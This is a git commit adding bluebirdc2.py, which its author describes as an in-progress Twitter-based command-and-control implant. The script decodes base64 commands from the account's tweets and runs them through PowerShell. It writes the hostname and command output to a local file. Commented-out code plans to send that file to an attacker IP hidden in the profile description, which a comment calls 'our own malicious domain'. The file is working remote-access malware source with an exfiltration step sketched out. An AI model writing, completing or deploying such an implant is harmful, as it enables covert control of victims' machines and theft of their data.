e5946b8219a2508e7298de9c4364e32e5d737724
BarrySploit <34023280+BarrySploit@users.noreply.github.com>
2023-04-09 14:15:13 -0600

    Add files via upload
    Twitter Based C2 framework - in progress

---
+++ bluebirdc2.py
@@ -0,0 +1,39 @@
+import base64
+import subprocess
+import requests
+import tweepy
+import os
+from dotenv import load_dotenv
+import re
+
+load_dotenv()
+consumer_key = os.environ["API_KEY"]
+consumer_secret = os.environ["API_KEY_SECRET"]
+access_token = os.environ["ACCESS_TOKEN"]
+access_token_secret = os.environ["ACCESS_TOKEN_SECRET"]
+
+auth = tweepy.OAuth1UserHandler(
+    consumer_key,
+    consumer_secret,
+    access_token,
+    access_token_secret
+)
+
+api = tweepy.API(auth)
+me = api.verify_credentials()
+found = re.findall("text='.*',",str(me))[0]
+tweet = found.split(',')[0].strip('text=').strip("'")
+
+command = base64.b64decode(tweet).decode()
+
+x = subprocess.getoutput("powershell.exe -command "+ command)
+y = subprocess.getoutput("hostname")
+final = y + "\n" + x
+with open("C:\\tmp\\"+ y +".txt",'w') as f:
+    f.write(final)
+
+#Add code here later to send the response to our own malicious domain (domain/ip is base64 encoded in user description)
+
+#ip_address = base64.b64decode(description).decode()
+#with open("C:\\tmp\\command.txt",'rb') as f:
+#   r = requests.post("http://" + ip_address + ":8000/upload",files=f)
